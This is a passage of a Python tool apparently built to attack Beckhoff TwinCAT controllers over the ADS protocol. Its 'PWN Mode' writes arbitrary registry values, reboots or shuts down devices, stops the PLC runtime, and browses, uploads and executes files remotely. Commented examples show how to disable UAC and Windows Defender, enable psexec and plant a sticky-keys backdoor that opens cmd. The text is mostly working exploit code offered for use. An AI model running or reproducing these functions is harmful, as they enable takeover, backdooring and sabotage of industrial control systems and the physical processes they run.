        #SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 ## This enables psexec for administrator users
        #SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA /t REG_DWORD /d 0  ## This disables UAC (after reboot)
        #SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe\ /v debugger /t REG_SZ /d "powershell -c cmd" ## This allows hotkeys to call cmd
        #SOFTWARE\Policies\Microsoft\Windows Defender\ /v DisableAntiSpyware /t REG_DWORD /d 1 ## This disables AV (after reboot)
        #SYSTEM\CurrentControlSet\\Services\\PCNetSoftware RAC Server\ /v ErrorControl /t REG_DWORD /d 1 ## create service
        #SYSTEM\CurrentControlSet\\Services\\PCNetSoftware RAC Server\ /v ImagePath /t REG_EXPAND_SZ /d "C:\Program Files\PCNetSoftware\RAC Server\RACs.exe" ## configure service
        #SYSTEM\CurrentControlSet\\Services\\PCNetSoftware RAC Server\ /v ObjectName /t REG_SZ /d "LocalSystem" ## configure service
        #SYSTEM\CurrentControlSet\\Services\\PCNetSoftware RAC Server\ /v Start /t REG_DWORD /d 2 ## start before logon
        #SYSTEM\CurrentControlSet\\Services\\PCNetSoftware RAC Server\ /v Type /t REG_DWORD /d 16 ## start as SYSTEM
        sRegPath = input('Path to use [SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\]: ') or 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\'
        sRegKey = input('Key to use [EnableLUA]: ') or 'EnableLUA'
        sRegType = input('REG_DWORD or REG_SZ [D/s]: ').lower() or 'd'
        if sRegType == 'd':
            bRegType = bytes.fromhex(reverseByte(hex(4)[2:].zfill(8)))
            sRegVal = input('Decimal value to write [0]: ') or '0'
            iRegVal = int(sRegVal) if sRegVal.isdigit() else 0
            bRegVal = bytes.fromhex(reverseByte(hex(iRegVal)[2:].zfill(8)))
        else:
            bRegType = bytes.fromhex(reverseByte(hex(1)[2:].zfill(8)))
            sRegVal = input('Value to write [""]: ') or ''
            bRegVal = sRegVal.encode()
        print('\nAttempting to write value {} to key {} at path HKLM\\{}'.format(sRegVal, sRegKey, sRegPath))
        sPacket = constructAMSPacket(lstDevice['RNETID'], sLNETID, 3, (200, 0, b'\x00'.join((sRegPath.encode(), sRegKey.encode(), bRegType)) + bRegVal))
        sErrorCode = parseADSResponse(parseAMSResponse(send_and_recv(oSock, sPacket))['ADSData'])['ErrorCode']
        if not sErrorCode == '00000000': print('[-] Something went wrong, action not successful')
        print('[+] Registry successfully altered')
        input('\nPress [Enter] to return')
    oSock.close()
    return

def setDevice(lstDevice, sLNETID):
    os.system('cls' if os.name == 'nt' else 'clear')
    print('Change Device State: ')
    print('[R] Reboot')
    print('[S] Shutdown')
    print('[A] Abort Pending Shutdown')
    print('[C] Cancel')
    sAns = input('Select [C]: ').lower()
    if not sAns == 'r' and not sAns == 's' and not sAns == 'a': return
    sDelay = input('\nDelay (in seconds) [0]: ').lower() if sAns == 's' else '0'
    iDelay = int(sDelay) if sDelay.isdigit() else 0
    sAns2 = input('\nReally perform this action? [y/N]: ').lower()
    if not sAns2 == 'y': return
    oSock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    oSock.settimeout(_iTimeout)
    oSock.connect((lstDevice['IP'], 48898))
    ## Reboot is indexgroup 12 and offset 1, no delay
    ## Shutdown is indexgroup 12 and offset 0, delay in seconds as 4 bytes (eg '0c000000'=12 seconds)
    ## Cancel Shutdown is indexgroup 10, offset 0
    if sAns == 'r':
        sPacket = constructAMSPacket(lstDevice['RNETID'], sLNETID, 5, (12, 1, b''))
        sResp = send_and_recv(oSock, sPacket)
    elif sAns == 's':
        bDelay = bytes.fromhex(reverseByte(hex(iDelay)[2:].zfill(8)))
        sPacket = constructAMSPacket(lstDevice['RNETID'], sLNETID, 5, (12, 0, bDelay))
        sResp = send_and_recv(oSock, sPacket)
    else:
        sPacket = constructAMSPacket(lstDevice['RNETID'], sLNETID, 5, (10, 0, b''))
        sResp = send_and_recv(oSock, sPacket)
    oSock.close()
    sErrorCode = parseAMSResponse(sResp)['ADSData']
    if not sErrorCode == '00000000': 
        print('[-] Something went wrong, action not successful')
        time.sleep(2)
        return False
    print('[+] Action completed successfully')
    time.sleep(2)
    return True

def browseFiles(lstDevice, sLNETID):
    sPath = 'C:\\'
    oSock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    oSock.settimeout(_iTimeout)
    oSock.connect((lstDevice['IP'], 48898))
    
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        print('Browse Files From {}'.format(lstDevice['NAME']))
        print('[q ] Return')
        print('[f ] Refresh folder')
        print('[c ] Change Drive (currently ' + sPath + ')')
        print('[o#] Open Directory (i.e. o1)')
        print('[d#] Download File (i.e. d5)')
        print('[u ] Upload File to current folder')
        print('[e#] Execute file')
        #print('[a ] Reset Connection With target')
        print('[r ] Reset Path to C:\\')
        print('')
        print('Current path: ' + sPath)
        print('')
        print('Directory: ')
        if not sPath[-1:] == '\\': sPath += '\\'
        lstAllItems = getDirContent(lstDevice, sLNETID, oSock, sPath)
        i = 0
        for lstItem in lstAllItems:
            i += 1
            if lstItem['File']: sFileSize = str(int(lstItem['FileSize']/1024)) + ' KB'
            print('[{}] {} {} {} {}'.format(str(i).ljust(3), lstItem['LastWriteTime'], '     ' if lstItem['File'] else '<DIR>', sFileSize.ljust(20) if lstItem['File'] else ''.ljust(20), lstItem['FileName']))
        
        sAns = input('\nCommand [q]: ').lower()
        if sAns == 'r': sPath = 'C:\\'
        elif sAns == 'f': continue
        elif sAns == 'c':
            sAns2 = input('\nPlease drive letter [C]: ').upper()
            if sAns2 == '': sAns2 = 'C'
            sPath = sAns2[:1] + ':\\'
        elif sAns[:1] == 'd':
            iIndex = int(sAns[1:]) - 1
            sFileName = lstAllItems[iIndex]['FileName']
            if downloadFile(lstDevice, sLNETID, oSock, sPath, sFileName):
                print('[+] File {} downloaded succesfully!'.format(sFileName))
                time.sleep(2)
        elif sAns == 'u':
            print('[!] Upload file to {}'.format(sPath))
            sFilePath = input('\nEnter file to upload or press enter to Cancel: ')
            if sFilePath == '': continue
            sAns2 = input('Also execute after uploading? [y/N]: ').lower()
            if not os.path.exists(sFilePath): 
                print('[-] Error: File {} not found.'.format(sFilePath))
                time.sleep(2)
            sFileName = os.path.basename(sFilePath)
            if uploadFile(lstDevice, sLNETID, oSock, sFilePath, sPath + sFileName):
                print('[+] Upload successful for file {}'.format(sFileName))
                if sAns2[:1] == 'y': 
                    if executeRemoteFile(lstDevice, sLNETID, oSock, sPath + sFileName, sPath, ''): print('[+] File executed successfully')
                    else: print('[-] Something went wrong')
                time.sleep(2)
        elif sAns[:1] == 'e':
            iIndex = int(sAns[1:]) - 1
            sFileName = lstAllItems[iIndex]['FileName']
            if executeRemoteFile(lstDevice, sLNETID, oSock, sPath + sFileName, sPath, ''): print('[+] File executed successfully')
            else: print('[-] Something went wrong')
            time.sleep(2)
        elif sAns[:1] == 'o':
            iIndex = int(sAns[1:]) - 1
            sPath += lstAllItems[iIndex]['FileName'] + '\\'
        else: break    
    oSock.close()
    return

def setTwincat(lstDevice, sLNETID):
    global _boolReachable
    os.system('cls' if os.name == 'nt' else 'clear')
    state = getState(lstDevice, sLNETID)
    if state == 'ERROR':
        _boolReachable = False
        return
    print('      ###--- TWINCAT SERVICE ---###')
    print('Twincat is currently in ' + state + ' mode')
    print()
    print('[1] RUN')
    print('[2] RESET')
    print('[3] STOP')
    print('[4] CONFIG')
    print('[C] Cancel')
    sAnswer = input('\nWhich mode you want to restart Twincat? [C]: ').lower()
    if sAnswer == '' or not sAnswer.isdigit() or int(sAnswer) > 4: return
    oSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    oSock.settimeout(2*_iTimeout)
    oSock.connect((lstDevice['IP'], 48898))
    if sAnswer == '1':
        print('## (Re)Start in RUN') ## 0200
        #packet = '000028000000 '+lstDevice['RNETID']+' 1027 '+LNETID+'a780 0500 040008000000000000000d050000 0200 000000000000'
        sPacket = constructAMSPacket(lstDevice['RNETID'], sLNETID, 5, (2, 0, b''))
    elif sAnswer == '2':
        print('## RESET Twincat') ## 0500
        sPacket = constructAMSPacket(lstDevice['RNETID'], sLNETID, 5, (5, 0, b''))
    elif sAnswer == '3':
        print('## STOP Twincat\n    Watch out, system may become unresponsive') ## 0600
        sPacket = constructAMSPacket(lstDevice['RNETID'], sLNETID, 5, (6, 0, b''))
    elif sAnswer == '4':
        print('## (Re)Start in CONFIG') ## 1000
        sPacket = constructAMSPacket(lstDevice['RNETID'], sLNETID, 5, (16, 0, b''))
    bResp = send_and_recv(oSock, sPacket)
    sErrorCode = parseAMSResponse(bResp)['ErrorCode']
    if not sErrorCode == '00000000': print('[-] Error: something went wrong')
    else: print('\n[+] Successful!')
    oSock.close()
    input('[!] Press [Enter] to continue')
    return
    

#### MAIN PROGRAM ####
os.system('cls' if os.name == 'nt' else 'clear')
## Select Adapter
oInt = selectInterface()
sLHOST = oInt[1]
sLNETID = '{}{}{}{}0101'.format(hex(int(sLHOST.split('.')[0]))[2:].zfill(2), hex(int(sLHOST.split('.')[1]))[2:].zfill(2), hex(int(sLHOST.split('.')[2]))[2:].zfill(2), hex(int(sLHOST.split('.')[3]))[2:].zfill(2))

os.system('cls' if os.name == 'nt' else 'clear')
## Get Devicelist (array of IP, NAME, AMSNetID as hex string, Twincatversion, Kernelbuild and optionally SSLTHUMBPRINT)
##  {'IP': '192.168.50.140', 'NAME': 'Musk-EngWS', 'RNETID': '0a323c160101', 'TCVER': '3.1.4024', 'WINVER': '10.0.22000', 'SSLTHUMBPRINT': '79A91921E1A94AD6448AF3A70AC7673039E17F142E3E95D65B6C924718DB7637'}
lstDevices = getDevices(sLHOST, sLNETID, _iTimeout)
if len(lstDevices)==0:
    print('No devices found, stopping')
    input('Press [Enter]')
    exit()

## Main Functionality
while True:
    os.system('cls' if os.name == 'nt' else 'clear')
    print('      ###--- DEVICELIST ---###')
    i = 1
    for lstDevice in lstDevices:
        sAmsnetID = getNetIDAsString(lstDevice['RNETID'])
        sToPrint = '[{}] {} ({}, {}, {}, {}'.format(i, lstDevice['IP'], lstDevice['NAME'], sAmsnetID, lstDevice['WINVER'], lstDevice['TCVER'])
        if lstDevice['SSLTHUMBPRINT']: sToPrint += ', SSL)'
        else: sToPrint += ')'
        print(sToPrint)
        i+=1
    print('[Q] Quit now')
    answer = input('Please select the device [1]: ')
    #answer = ''
    if answer.lower() == 'q': exit()
    if answer == '' or not answer.isdigit() or int(answer)>=i: answer=1
    lstDevice = lstDevices[int(answer)-1]
    if getState(lstDevice, sLNETID) == 'ERROR': _boolReachable = False
    else: _boolReachable = True
    ## Device Menu
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        print('###--- MAIN MENU FOR ' + lstDevice['NAME'] + ' ---###')
        print('Kernel: {}, NETID: {}'.format(lstDevice['WINVER'], sAmsnetID))
        if lstDevice['SSLTHUMBPRINT']: print('SSL Thumbprint: {}'.format(lstDevice['SSLTHUMBPRINT']))
        print()
        print('[T] Verify connectivity')
        print('[A] Add Route')
        if _boolReachable:
            print('[D] Delete Route')
            print('[L] List more information, including routes')
            print('[C] Change Twincat State')
            print('[V] Manage Variables')
        if _boolReachable and _boolPwnMode:
            print('[B] Browse Files')
            print('[S] Shutdown/Restart Device')
            print('[R] Access Windows Registry')
        elif _boolReachable:
            print('[P] Enable PWN Mode')

        print()
        print('[O] Choose other device')
        print('[Q] Quit now')
        print()
        sAnswer2 = input('Please select what you want to do with {} ({}) [T]: '.format(lstDevice['NAME'], lstDevice['IP'])).lower()
        #sAnswer2='c'
        if sAnswer2 == 'q': exit()
        elif sAnswer2 == 'l': getInfo(lstDevice, sLHOST, sLNETID)
        elif sAnswer2 == 'a': addRoute(lstDevice, sLHOST, sLNETID)
        elif sAnswer2 == 'd': delRoute(lstDevice, sLHOST, sLNETID)
        elif sAnswer2 == 'c': setTwincat(lstDevice, sLNETID)
        elif sAnswer2 == 'v': manageVariables(lstDevice, sLNETID)
        elif sAnswer2 == 'b': browseFiles(lstDevice, sLNETID)
        elif sAnswer2 == 's': setDevice(lstDevice, sLNETID)
        elif sAnswer2 == 'r': manageRegistry(lstDevice, sLNETID)
        elif sAnswer2 == 'p': _boolPwnMode = True
        elif sAnswer2 == 'o': break
        elif sAnswer2 == 't' or sAnswer2 == '': verifyDevice(lstDevice, sLHOST, sLNETID)
